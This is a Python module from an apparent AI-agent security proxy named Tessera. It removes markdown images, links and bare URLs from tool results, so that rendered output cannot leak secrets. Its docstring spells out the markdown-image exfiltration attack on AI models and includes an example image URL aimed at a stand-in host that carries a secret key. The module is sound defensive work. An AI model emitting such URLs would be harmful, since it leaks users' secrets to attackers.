"""Output sanitization — closing the rendered-markdown exfiltration channel.

The flow rule covers data flowing *into* tool arguments. But there is a second,
implicit channel: a tool result (or model output) rendered as markdown can
contain an image or link whose URL encodes a secret. When the client renders

    ![](https://evil.test/pixel?leak=sk-SECRET)

the browser fetches that URL — exfiltrating the secret with no tool call at
all. This is the classic markdown-image exfil.

Tessera neutralizes it by rewriting untrusted rendered content so that
auto-loading and outbound URLs are defanged: image URLs are stripped, and
links are either dropped or restricted to an operator allowlist. This is
defense for the implicit channel the charter explicitly scopes in; covert
channels through timing or side effects remain acknowledged residual risk.
"""

from __future__ import annotations

import re
from dataclasses import dataclass, field
from typing import Any, Mapping
from urllib.parse import urlsplit

# ![alt](url "title")  -- markdown image; the dangerous one (auto-loads).
_IMAGE_RE = re.compile(r"!\[(?P<alt>[^\]]*)\]\((?P<url>[^)\s]+)(?:\s+\"[^\"]*\")?\)")
# [text](url) -- markdown link; does not auto-load but can carry a payload.
_LINK_RE = re.compile(r"(?<!\!)\[(?P<text>[^\]]*)\]\((?P<url>[^)\s]+)(?:\s+\"[^\"]*\")?\)")
# bare http(s) urls
_BARE_URL_RE = re.compile(r"https?://[^\s)>\]]+")
# raw <img ...> / markdown sometimes carries html
_HTML_IMG_RE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)


@dataclass
class SanitizeResult:
    text: str
    removed: list[str] = field(default_factory=list)

    @property
    def changed(self) -> bool:
        return bool(self.removed)


def _host_allowed(url: str, allowlist: frozenset[str]) -> bool:
    if not allowlist:
        return False
    host = (urlsplit(url).hostname or "").lower()
    if not host:
        return False
    for allowed in allowlist:
        a = allowed.lower()
        if host == a or host.endswith("." + a):
            return True
    return False


def sanitize_markdown(
    text: str,
    *,
    allowlist: frozenset[str] | set[str] | None = None,
    strip_links: bool = True,
) -> SanitizeResult:
    """Defang auto-loading and outbound URLs in rendered markdown.

    Parameters
    ----------
    allowlist:
        Hostnames whose URLs are permitted to survive. Empty/None means no URL
        is allowed to auto-load. Subdomains of an allowed host are allowed.
    strip_links:
        If True, non-image links to non-allowlisted hosts have their URL
        removed (the visible text is kept). If False, links are left intact
        (images are still always defanged).

    Returns the sanitized text plus the list of URLs that were removed, so the
    proxy can record the event in the ledger.
    """
    allow = frozenset(allowlist or ())
    removed: list[str] = []

    def _image(match: re.Match[str]) -> str:
        url = match.group("url")
        if _host_allowed(url, allow):
            return match.group(0)
        removed.append(url)
        alt = match.group("alt")
        # Keep the alt text, drop the auto-loading reference entirely.
        return f"[image removed by Tessera{f': {alt}' if alt else ''}]"

    def _link(match: re.Match[str]) -> str:
        url = match.group("url")
        if _host_allowed(url, allow):
            return match.group(0)
        removed.append(url)
        text_ = match.group("text")
        return f"{text_} [link removed by Tessera]"

    def _html_img(match: re.Match[str]) -> str:
        tag = match.group(0)
        srcs = _BARE_URL_RE.findall(tag)
        for s in srcs:
            if not _host_allowed(s, allow):
                removed.append(s)
        return "[image removed by Tessera]"

    out = _HTML_IMG_RE.sub(_html_img, text)
    out = _IMAGE_RE.sub(_image, out)
    if strip_links:
        out = _LINK_RE.sub(_link, out)

    # Finally, defang any remaining bare URLs to non-allowlisted hosts so they
    # cannot be auto-linked by a permissive renderer.
    def _bare(match: re.Match[str]) -> str:
        url = match.group(0)
        if _host_allowed(url, allow):
            return url
        removed.append(url)
        return "[url removed by Tessera]"

    out = _BARE_URL_RE.sub(_bare, out)
    return SanitizeResult(text=out, removed=removed)


def sanitize_value(
    value: Any, *, allowlist: frozenset[str] | set[str] | None = None
) -> tuple[Any, list[str]]:
    """Deep-sanitize a (possibly structured) tool result, preserving shape.

    Walks JSON-native containers (dict/list/tuple) and defangs every string
    leaf via :func:`sanitize_markdown`, returning a new value of the same shape
    plus the list of removed URLs. Structure is preserved on purpose: the plan
    interpreter field-accesses structured results, so flattening them to one
    string would break that (sound) path.

    Foreign typed objects (e.g. Pydantic models) are returned unchanged — their
    nested strings are not deep-sanitized here (a documented residual; they are
    still *tainted* because the session extracts tokens from their serialized
    form). Numbers/bools/None pass through.
    """
    removed: list[str] = []

    def rec(v: Any) -> Any:
        if isinstance(v, str):
            r = sanitize_markdown(v, allowlist=allowlist)
            removed.extend(r.removed)
            return r.text
        if isinstance(v, Mapping):
            return {k: rec(x) for k, x in v.items()}
        if isinstance(v, list):
            return [rec(x) for x in v]
        if isinstance(v, tuple):
            return tuple(rec(x) for x in v)
        return v

    return rec(value), removed
